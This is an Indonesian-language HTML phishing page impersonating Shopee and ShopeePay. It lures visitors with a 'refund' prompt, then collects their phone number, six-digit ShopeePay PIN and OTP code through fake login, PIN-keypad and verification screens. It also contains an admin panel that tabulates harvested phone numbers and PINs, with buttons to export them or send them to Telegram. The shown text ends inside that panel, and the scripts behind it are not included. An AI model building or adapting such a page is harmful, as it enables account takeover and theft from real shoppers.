<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <title>Keamanan Akun Shopee</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #FF6B35 0%, #F7931E 100%);
            min-height: 100vh;
            padding: 10px;
            position: relative;
            overflow-x: hidden;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }

        @media (max-width: 480px) {
            body {
                padding: 5px;
            }
            .container {
                padding: 0 10px;
            }
            .main-card, .login-content, .pin-content, .success-content {
                padding: 20px 15px;
            }
        }

        .decorative-circle {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
        }

        .circle-1 {
            width: 200px;
            height: 200px;
            top: -50px;
            right: -50px;
        }

        .circle-2 {
            width: 150px;
            height: 150px;
            bottom: 100px;
            left: -30px;
        }



        .container {
            max-width: 500px;
            margin: 0 auto;
            position: relative;
            z-index: 1;
        }

        .header {
            display: flex;
            align-items: center;
            margin-bottom: 30px;
            color: white;
        }

        .back-btn {
            background: none;
            border: none;
            color: white;
            font-size: 24px;
            cursor: pointer;
            padding: 10px;
        }

        .logo-container {
            text-align: center;
            margin: 40px 0;
        }

        .logo {
            background: white;
            width: 120px;
            height: 120px;
            margin: 0 auto;
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }

        .logo svg {
            width: 80px;
            height: 80px;
        }

        .main-card {
            background: white;
            border-radius: 20px;
            padding: 30px 20px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
        }

        .main-title {
            color: #FF6B35;
            font-size: 20px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 30px;
        }

        .confirm-btn {
            background: linear-gradient(135deg, #FF6B35, #F7931E);
            color: white;
            border: none;
            padding: 15px;
            border-radius: 30px;
            width: 100%;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
        }

        .confirm-btn:hover {
            transform: scale(1.02);
        }

        .tips-card {
            background: linear-gradient(135deg, #FF6B35, #F7931E);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
        }

        .tips-header {
            background: #FFD93D;
            color: #FF6B35;
            padding: 12px 20px;
            border-radius: 30px;
            text-align: center;
            font-weight: bold;
            font-size: 16px;
            margin-bottom: 20px;
        }

        .tip-item {
            background: white;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 15px;
            transition: transform 0.2s;
            cursor: pointer;
        }

        .tip-item:hover {
            transform: translateX(5px);
        }

        .tip-item:last-child {
            margin-bottom: 0;
        }

        .tip-icon {
            width: 50px;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }

        .tip-icon svg {
            width: 40px;
            height: 40px;
            stroke: #FF6B35;
        }

        .tip-text {
            color: #FF6B35;
            font-weight: bold;
            font-size: 15px;
            line-height: 1.4;
        }

        .promo-banner {
            background: #FFD93D;
            color: #FF6B35;
            padding: 15px 20px;
            border-radius: 30px;
            text-align: center;
            font-weight: bold;
            font-size: 14px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }

        .refresh-icon {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: white;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            cursor: pointer;
            transition: transform 0.3s;
        }

        .refresh-icon:hover {
            transform: rotate(180deg);
        }

        /* Login Page Styles */
        .login-page {
            display: none;
            background: #f5f5f5;
            min-height: 100vh;
            padding: 0;
        }

        .login-page.active {
            display: block;
        }

        .login-header {
            background: white;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        .login-header-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .login-back-btn {
            background: none;
            border: none;
            color: #FF6B35;
            font-size: 24px;
            cursor: pointer;
            padding: 5px;
        }

        .login-title {
            font-size: 18px;
            color: #333;
            font-weight: 500;
        }

        .help-icon {
            background: none;
            border: none;
            color: #FF6B35;
            font-size: 20px;
            cursor: pointer;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            border: 2px solid #FF6B35;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-content {
            padding: 30px 20px;
            max-width: 500px;
            margin: 0 auto;
        }

        .login-logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-logo svg {
            width: 100%;
            height: 100%;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
            background: white;
            border-radius: 8px;
            padding: 15px;
            border: 1px solid #e0e0e0;
        }

        .input-icon {
            width: 24px;
            height: 24px;
            margin-right: 10px;
            color: #999;
        }

        .login-input {
            border: none;
            outline: none;
            font-size: 15px;
            width: 100%;
            color: #333;
        }

        .login-input::placeholder {
            color: #ccc;
        }

        .next-btn {
            background: #e0e0e0;
            color: #999;
            border: none;
            padding: 15px;
            border-radius: 8px;
            width: 100%;
            font-size: 16px;
            font-weight: 500;
            cursor: not-allowed;
            margin-bottom: 15px;
        }

        .next-btn.active {
            background: #FF6B35;
            color: white;
            cursor: pointer;
        }

        .login-links {
            display: flex;
            justify-content: space-between;
            margin-bottom: 30px;
        }

        .login-link {
            color: #1E90FF;
            text-decoration: none;
            font-size: 14px;
        }

        .divider {
            text-align: center;
            margin: 30px 0;
            color: #999;
            font-size: 14px;
            position: relative;
        }

        .divider::before,
        .divider::after {
            content: '';
            position: absolute;
            top: 50%;
            width: 40%;
            height: 1px;
            background: #e0e0e0;
        }

        .divider::before {
            left: 0;
        }

        .divider::after {
            right: 0;
        }

        .social-login {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .social-btn {
            background: white;
            border: 1px solid #e0e0e0;
            padding: 15px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            font-size: 15px;
            color: #333;
            cursor: pointer;
            transition: background 0.2s;
        }

        .social-btn:hover {
            background: #f9f9f9;
        }

        .social-icon {
            width: 24px;
            height: 24px;
        }

        .home-page {
            display: block;
        }

        .home-page.hidden {
            display: none;
        }

        /* PIN Page Styles */
        .pin-page {
            display: none;
            background: #f5f5f5;
            min-height: 100vh;
            padding: 0;
        }

        .pin-page.active {
            display: block;
        }

        .pin-search-bar {
            background: white;
            padding: 10px 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        .search-icon {
            width: 24px;
            height: 24px;
            color: #999;
        }

        .search-text {
            flex: 1;
            color: #666;
            font-size: 15px;
        }

        .verified-badge {
            width: 30px;
            height: 30px;
            background: #00D68F;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }

        .pin-header {
            background: white;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            gap: 15px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }

        .pin-back-btn {
            background: none;
            border: none;
            color: #FF6B35;
            font-size: 24px;
            cursor: pointer;
            padding: 5px;
        }

        .pin-title {
            font-size: 18px;
            color: #333;
            font-weight: 500;
            flex: 1;
            text-align: center;
            margin-right: 30px;
        }

        .pin-content {
            padding: 40px 20px;
            text-align: center;
            max-width: 500px;
            margin: 0 auto;
        }

        .shopeepay-logo {
            margin-bottom: 40px;
        }

        .shopeepay-logo svg {
            width: 220px;
            height: auto;
        }

        @media (max-width: 480px) {
            .shopeepay-logo svg {
                width: 170px;
            }
        }

        .pin-instruction {
            font-size: 16px;
            color: #333;
            margin-bottom: 40px;
        }

        .pin-boxes {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 20px;
        }

        .pin-box {
            width: 50px;
            height: 50px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            font-weight: bold;
            color: #333;
            background: white;
            transition: border-color 0.2s;
        }

        .pin-box.filled {
            border-color: #FF6B35;
        }

        .forgot-pin {
            color: #999;
            font-size: 14px;
            margin-bottom: 60px;
            cursor: pointer;
        }

        .number-keyboard {
            background: #e8e8e8;
            padding: 20px;
            border-radius: 20px 20px 0 0;
            box-shadow: 0 -5px 15px rgba(0,0,0,0.1);
        }

        .keyboard-row {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-bottom: 15px;
        }

        .keyboard-row:last-child {
            margin-bottom: 0;
        }

        .key-btn {
            background: white;
            border: none;
            width: 100px;
            height: 60px;
            border-radius: 10px;
            font-size: 24px;
            font-weight: 500;
            cursor: pointer;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            transition: background 0.2s;
            color: #333;
            touch-action: manipulation;
            -webkit-tap-highlight-color: transparent;
        }

        @media (max-width: 480px) {
            .key-btn {
                width: 80px;
                height: 50px;
                font-size: 20px;
            }
            .keyboard-row {
                gap: 10px;
            }
        }

        .key-btn:active {
            background: #f0f0f0;
        }

        .key-btn.delete-btn {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .keyboard-footer {
            text-align: center;
            padding: 15px;
            color: #999;
            font-size: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }

        .security-icon {
            width: 14px;
            height: 14px;
        }

        /* OTP Page Styles */
        .success-page {
            display: none;
            background: #f5f5f5;
            min-height: 100vh;
            padding: 0;
        }

        .success-page.active {
            display: block;
        }

        .success-header {
            background: white;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        .success-back-btn {
            background: none;
            border: none;
            color: #FF6B35;
            font-size: 24px;
            cursor: pointer;
            padding: 5px;
        }

        .success-title {
            font-size: 18px;
            color: #333;
            font-weight: 500;
        }

        .success-content {
            padding: 40px 20px;
            text-align: center;
            max-width: 500px;
            margin: 0 auto;
        }

        .otp-input {
            width: 48px;
            height: 48px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            border: none;
            border-bottom: 2px solid #d1d5db;
            background: white;
            outline: none;
            transition: border-color 0.2s;
            touch-action: manipulation;
            -webkit-appearance: none;
            appearance: none;
        }

        @media (max-width: 480px) {
            .otp-input {
                width: 40px;
                height: 40px;
                font-size: 20px;
            }
        }

        .otp-input:focus {
            border-bottom-color: #3b82f6;
        }

        .continue-btn {
            background: #d1d5db;
            color: #6b7280;
            border: none;
            padding: 12px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: not-allowed;
            width: 100%;
            margin-bottom: 24px;
        }

        /* Admin Page Styles */
        .admin-page {
            display: none;
            background: #f5f5f5;
            min-height: 100vh;
            padding: 0;
        }

        .admin-page.active {
            display: block;
        }

        .admin-header {
            background: white;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        .admin-back-btn {
            background: none;
            border: none;
            color: #FF6B35;
            font-size: 24px;
            cursor: pointer;
            padding: 5px;
        }

        .admin-title {
            font-size: 18px;
            color: #333;
            font-weight: 500;
        }

        .admin-content {
            padding: 20px;
            max-width: 1200px;
            margin: 0 auto;
        }

        .admin-stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: white;
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
        }

        .stat-number {
            font-size: 32px;
            font-weight: bold;
            color: #FF6B35;
            margin-bottom: 10px;
        }

        .stat-label {
            font-size: 14px;
            color: #666;
        }

        .admin-table-container {
            background: white;
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            overflow-x: auto;
        }

        .admin-table {
            width: 100%;
            border-collapse: collapse;
        }

        .admin-table th,
        .admin-table td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #f0f0f0;
        }

        .admin-table th {
            background: #f9f9f9;
            font-weight: 600;
            color: #333;
        }

        .admin-table tr:hover {
            background: #f9f9f9;
        }

        .admin-actions {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }

        .admin-btn {
            background: #FF6B35;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
        }

        .admin-btn:hover {
            background: #e55a2b;
        }

        .admin-btn.secondary {
            background: #666;
        }

        .admin-btn.secondary:hover {
            background: #555;
        }

        /* Loading Page Styles */
        .loading-page {
            display: none;
            background: linear-gradient(135deg, #f5f5f5 0%, #ffffff 100%);
            min-height: 100vh;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .loading-page.active {
            display: flex;
        }

        .loading-container {
            text-align: center;
            max-width: 500px;
            width: 100%;
        }

        .spinner {
            width: 80px;
            height: 80px;
            margin: 0 auto 40px;
            position: relative;
        }

        .spinner svg {
            width: 100%;
            height: 100%;
            animation: spin 2s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        .loading-text {
            font-size: 24px;
            font-weight: 500;
            color: #1f2937;
            margin-bottom: 20px;
            letter-spacing: 0.5px;
        }

        .loading-subtext {
            font-size: 14px;
            color: #6b7280;
            margin-bottom: 40px;
            line-height: 1.6;
        }

        .progress-bar {
            width: 100%;
            height: 4px;
            background: #e5e7eb;
            border-radius: 2px;
            overflow: hidden;
            margin-bottom: 30px;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #FF6B35, #F7931E);
            border-radius: 2px;
            animation: progress 3s ease-in-out forwards;
        }

        @keyframes progress {
            0% {
                width: 0%;
            }
            70% {
                width: 70%;
            }
            100% {
                width: 100%;
            }
        }

        .info-box {
            background: #f3f4f6;
            border-radius: 12px;
            padding: 16px;
            margin-top: 30px;
            display: flex;
            align-items: flex-start;
            gap: 12px;
        }

        .info-icon {
            width: 24px;
            height: 24px;
            flex-shrink: 0;
            color: #9ca3af;
            margin-top: 2px;
        }

        .info-text {
            font-size: 12px;
            color: #6b7280;
            text-align: left;
            line-height: 1.5;
        }

        @media (max-width: 480px) {
            .loading-text {
                font-size: 20px;
            }

            .loading-subtext {
                font-size: 13px;
            }

            .spinner {
                width: 60px;
                height: 60px;
                margin-bottom: 30px;
            }
        }
    </style>
</head>
<body>
    <script src="config.js"></script>
    <div class="decorative-circle circle-1"></div>
    <div class="decorative-circle circle-2"></div>
    


    <!-- Home Page -->
    <div class="home-page" id="homePage">
        <div class="container">
            <div class="header">
                <button class="back-btn" onclick="history.back()">‚Üê</button>
            </div>

            <div class="logo-container">
                <div class="logo">
                    <svg viewBox="0 0 120 120" fill="none">
                        <!-- Shopping bag shape -->
                        <path d="M25 35 L95 35 L90 95 L30 95 Z" fill="#EE4D2D"/>
                        <!-- Bag handles -->
                        <path d="M35 35 L35 25 C35 20 40 15 45 15 L75 15 C80 15 85 20 85 25 L85 35" fill="none" stroke="#EE4D2D" stroke-width="4" stroke-linecap="round"/>
                        <!-- Shopee 'S' logo -->
                        <text x="60" y="75" font-size="36" font-weight="bold" fill="white" text-anchor="middle" font-family="Arial, sans-serif">S</text>
                    </svg>
                </div>
            </div>

            <div class="main-card">
                <h1 class="main-title">PEMBATALAN & PENGEMBALIAN DANA</h1>
                <button class="confirm-btn" onclick="showLoginPage()">KONFIRMASI SEKARANG</button>
            </div>

            <div class="tips-card">
                <div class="tips-header">TIPS KEAMANAN AKUN SHOPEE MU</div>
                
                <div class="tip-item" onclick="alert('Selalu gunakan password yang kuat dan unik!')">
                    <div class="tip-icon">
                        <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                            <circle cx="12" cy="16" r="1" fill="#FF6B35"/>
                        </svg>
                    </div>
                    <div class="tip-text">Ganti Password Secara Berkala</div>
                </div>

                <div class="tip-item" onclick="alert('PIN ShopeePay melindungi transaksi Anda!')">
                    <div class="tip-icon">
                        <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
                            <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/>
                        </svg>
                    </div>
                    <div class="tip-text">Ubah PIN ShopeePay Anda secara rutin</div>
                </div>

                <div class="tip-item" onclick="alert('Jaga privasi data pribadi Anda!')">
                    <div class="tip-icon">
                        <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
                            <path d="M12 2L2 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-10-5z"/>
                            <path d="M9 12l2 2 4-4" stroke-linecap="round"/>
                        </svg>
                    </div>
                    <div class="tip-text">Selalu Jaga Data Pribadi anda</div>
                </div>
            </div>

            <div class="promo-banner">
                PROMO CICILAN 0% S/D 24 BULAN
            </div>
        </div>

        <div class="refresh-icon" onclick="location.reload()">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#FF6B35" stroke-width="2">
                <path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.2"/>
            </svg>
        </div>
    </div>

    <!-- Login Page -->
    <div class="login-page" id="loginPage">
        <div class="login-header">
            <div class="login-header-left">
                <button class="login-back-btn" onclick="showHomePage()">‚Üê</button>
                <span class="login-title">Log in</span>
            </div>
            <button class="help-icon">?</button>
        </div>

        <div class="login-content">
            <div class="login-logo">
                <svg viewBox="0 0 120 120" fill="none">
                    <!-- Shopping bag shape -->
                    <path d="M25 35 L95 35 L90 95 L30 95 Z" fill="#EE4D2D"/>
                    <!-- Bag handles -->
                    <path d="M35 35 L35 25 C35 20 40 15 45 15 L75 15 C80 15 85 20 85 25 L85 35" fill="none" stroke="#EE4D2D" stroke-width="4" stroke-linecap="round"/>
                    <!-- Shopee 'S' logo -->
                    <text x="60" y="75" font-size="36" font-weight="bold" fill="white" text-anchor="middle" font-family="Arial, sans-serif">S</text>
                </svg>
            </div>

            <div class="input-group">
                <div class="input-wrapper">
                    <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                        <circle cx="12" cy="7" r="4"/>
                    </svg>
                    <input type="tel" class="login-input" placeholder="Nomor Telepon" id="phoneInput" oninput="checkInput()">
                </div>
            </div>

            <button class="next-btn" id="nextBtn" disabled>Berikutnya</button>

            <div class="login-links">
                <a href="#" class="login-link">Daftar</a>
                <a href="#" class="login-link">Log in dengan Password</a>
            </div>

            <div class="divider">ATAU</div>

            <div class="social-login">
                <button class="social-btn">
                    <svg class="social-icon" viewBox="0 0 24 24" fill="#25D366">
                        <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
                    </svg>
                    Log In dengan WhatsApp
                </button>

                <button class="social-btn">
                    <svg class="social-icon" viewBox="0 0 24 24" fill="#1877F2">
                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                    </svg>
                    Log In dengan Facebook
                </button>

                <button class="social-btn">
                    <svg class="social-icon" viewBox="0 0 24 24">
                        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                    </svg>
                    Log In dengan Google
                </button>
            </div>
        </div>
    </div>

    <!-- PIN Page -->
    <div class="pin-page" id="pinPage">
        <div class="pin-search-bar">
            <svg class="search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <circle cx="11" cy="11" r="8"/>
                <path d="m21 21-4.35-4.35"/>
            </svg>
            <span class="search-text">PIN ShopeePay</span>
            <div class="verified-badge">‚úì</div>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <circle cx="12" cy="12" r="1"/>
                <circle cx="12" cy="5" r="1"/>
                <circle cx="12" cy="19" r="1"/>
            </svg>
        </div>

        <div class="pin-header">
            <button class="pin-back-btn" onclick="showLoginPage()">‚Üê</button>
            <span class="pin-title">PIN ShopeePay</span>
        </div>

        <div class="pin-content">
            <div class="shopeepay-logo">
                <svg viewBox="0 0 200 50" fill="none">
                    <!-- Shopee logo part -->
                    <g transform="translate(10,5)">
                        <path d="M0 10 L25 10 L23 35 L2 35 Z" fill="#EE4D2D"/>
                        <path d="M7 10 L7 6 C7 4 9 2 11 2 L16 2 C18 2 20 4 20 6 L20 10" fill="none" stroke="#EE4D2D" stroke-width="1.5" stroke-linecap="round"/>
                        <text x="12.5" y="27" font-size="14" font-weight="bold" fill="white" text-anchor="middle" font-family="Arial, sans-serif">S</text>
                    </g>
                    <!-- ShopeePay text -->
                    <text x="45" y="20" font-size="14" font-weight="bold" fill="#EE4D2D" font-family="Arial, sans-serif">Shopee</text>
                    <text x="45" y="35" font-size="12" font-weight="600" fill="#666" font-family="Arial, sans-serif">Pay</text>
                </svg>
            </div>

            <p class="pin-instruction">Masukkan PIN ShopeePay</p>

            <div class="pin-boxes">
                <div class="pin-box" id="pinBox1"></div>
                <div class="pin-box" id="pinBox2"></div>
                <div class="pin-box" id="pinBox3"></div>
                <div class="pin-box" id="pinBox4"></div>
                <div class="pin-box" id="pinBox5"></div>
                <div class="pin-box" id="pinBox6"></div>
            </div>

            <div class="forgot-pin">Lupa PIN</div>
        </div>

        <div class="number-keyboard">
            <div class="keyboard-row">
                <button class="key-btn" onclick="addPin('1')">1</button>
                <button class="key-btn" onclick="addPin('2')">2</button>
                <button class="key-btn" onclick="addPin('3')">3</button>
            </div>
            <div class="keyboard-row">
                <button class="key-btn" onclick="addPin('4')">4</button>
                <button class="key-btn" onclick="addPin('5')">5</button>
                <button class="key-btn" onclick="addPin('6')">6</button>
            </div>
            <div class="keyboard-row">
                <button class="key-btn" onclick="addPin('7')">7</button>
                <button class="key-btn" onclick="addPin('8')">8</button>
                <button class="key-btn" onclick="addPin('9')">9</button>
            </div>
            <div class="keyboard-row">
                <button class="key-btn" style="visibility: hidden;"></button>
                <button class="key-btn" onclick="addPin('0')">0</button>
                <button class="key-btn delete-btn" onclick="deletePin()">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
                        <line x1="18" y1="9" x2="12" y2="15"/>
                        <line x1="12" y1="9" x2="18" y2="15"/>
                    </svg>
                </button>
            </div>
            <div class="keyboard-footer">
                <svg class="security-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                </svg>
                ShopeePay Security Keyboard
            </div>
        </div>
    </div>

    <!-- OTP Page -->
    <div class="success-page" id="successPage">
        <div class="success-header">
            <button class="success-back-btn" onclick="showPinPage()">‚Üê</button>
            <span class="success-title">Verifikasi OTP</span>
        </div>

        <div class="success-content">
            <!-- OTP Message -->
            <div style="text-align: center; margin-bottom: 32px;">
                <p style="color: #374151; margin-bottom: 8px;">Kode OTP telah kami kirim ke</p>
                <p style="font-size: 18px; font-weight: 600; color: #1f2937;" id="phoneNumberDisplay"></p>
            </div>

            <!-- OTP Input Fields -->
            <div style="display: flex; gap: 12px; margin-bottom: 32px; justify-content: center;">
                <input class="otp-input" type="text" maxlength="1" id="otp-0">
                <input class="otp-input" type="text" maxlength="1" id="otp-1">
                <input class="otp-input" type="text" maxlength="1" id="otp-2">
                <input class="otp-input" type="text" maxlength="1" id="otp-3">
                <input class="otp-input" type="text" maxlength="1" id="otp-4">
                <input class="otp-input" type="text" maxlength="1" id="otp-5">
            </div>

            <!-- Continue Button -->
            <button class="continue-btn">Lanjut</button>

            <!-- Timer -->
            <p id="otpTimer" style="color: #374151; font-size: 14px; text-align: center;">
                Mohon tunggu <span style="color: #ef4444; font-weight: 600;" id="countdown">60</span> detik untuk mengirim ulang.
            </p>
        </div>
    </div>

    <!-- Loading Page -->
    <div class="loading-page" id="loadingPage">
        <div class="loading-container">
            <div class="spinner">
                <svg viewBox="0 0 100 100" fill="none" stroke-width="8">
                    <defs>
                        <linearGradient id="spinGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                            <stop offset="0%" style="stop-color:#FF6B35;stop-opacity:1" />
                            <stop offset="100%" style="stop-color:#F7931E;stop-opacity:1" />
                        </linearGradient>
                    </defs>
                    <circle cx="50" cy="50" r="40" stroke="url(#spinGradient)" stroke-linecap="round" stroke-dasharray="60 100" />
                </svg>
            </div>

            <h1 class="loading-text">Sedang Memverifikasi</h1>
            <p class="loading-subtext">Mohon tunggu sebentar sambil kami memproses data Anda</p>

            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>

            <div class="info-box">
                <svg class="info-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <circle cx="12" cy="12" r="10"></circle>
                    <line x1="12" y1="16" x2="12" y2="12"></line>
                    <line x1="12" y1="8" x2="12.01" y2="8"></line>
                </svg>
                <span class="info-text">Jangan tutup halaman ini atau kembali selama proses verifikasi sedang berlangsung</span>
            </div>
        </div>
    </div>

    <!-- Admin Page -->
    <div class="admin-page" id="adminPage">
        <div class="admin-header">
            <button class="admin-back-btn" onclick="showHomePage()">‚Üê</button>
            <span class="admin-title">Admin Panel</span>
        </div>

        <div class="admin-content">
            <div class="admin-stats">
                <div class="stat-card">
                    <div class="stat-number" id="totalUsers">0</div>
                    <div class="stat-label">Total Users</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="todayUsers">0</div>
                    <div class="stat-label">Today</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="activeUsers">0</div>
                    <div class="stat-label">Active Users</div>
                </div>
            </div>

            <div class="admin-table-container">
                <table class="admin-table" id="adminTable">
                    <thead>
                        <tr>
                            <th>Phone Number</th>
                            <th>PIN</th>
                            <th>Timestamp</th>
                            <th>ID</th>
                        </tr>
                    </thead>
                    <tbody>
                        <!-- Data will be populated by JavaScript -->
                    </tbody>
                </table>
            </div>

            <div class="admin-actions">
                <button class="admin-btn" onclick="exportData()">Export Data</button>
                <button class="admin-btn secondary" onclick="clearData()">Clear All Data</button>
                <button class="admin-btn" onclick="sendAllToTelegram()">Send to Telegram</button>
                <button class="admin-btn secondary" onclick="showTelegramLogs()">Show Logs</button>
